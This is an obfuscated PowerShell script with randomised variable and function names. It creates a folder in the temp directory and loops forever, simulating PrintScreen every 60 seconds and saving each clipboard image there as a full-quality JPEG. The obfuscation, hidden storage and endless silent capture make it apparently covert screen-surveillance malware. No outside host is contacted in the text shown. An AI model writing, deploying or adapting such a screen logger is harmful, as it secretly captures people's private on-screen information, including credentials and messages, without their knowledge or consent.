[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
$ChqbrfwiEs = "$env:temp/amETlOMhPo"
mkdir $ChqbrfwiEs
Set-Location $ChqbrfwiEs
function oTQUhIuPql
{
    param(    
    [Switch]$yaIwHruzEh        
    )

    begin {
        Add-Type -AssemblyName System.Drawing
        $srzZBXVwhJ = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | 
            Where-Object { $_.FormatDescription -eq "JPEG" }
    }
    process {
        Start-Sleep -Milliseconds 250
        if ($yaIwHruzEh) {            
            [Windows.Forms.Sendkeys]::SendWait("%{PrtSc}")        
        } else {
            [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")        
        }
        Start-Sleep -Milliseconds 250
        $QxmDCwUIzG = [Windows.Forms.Clipboard]::GetImage()    
        $obxcfMnWDi = New-Object Drawing.Imaging.EncoderParameters  
        $obxcfMnWDi.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)  
        $yXHeZYvqgF = "$ChqbrfwiEs\cqTbMpzNLx"
        $c = 0
        while (Test-Path "${yXHeZYvqgF}${c}.jpg") {
            $c++
        }
        $QxmDCwUIzG.Save("${yXHeZYvqgF}${c}.jpg", $srzZBXVwhJ, $obxcfMnWDi)
    }

}

while ($true) {
    oTQUhIuPql
    Start-Sleep -Seconds 60
}
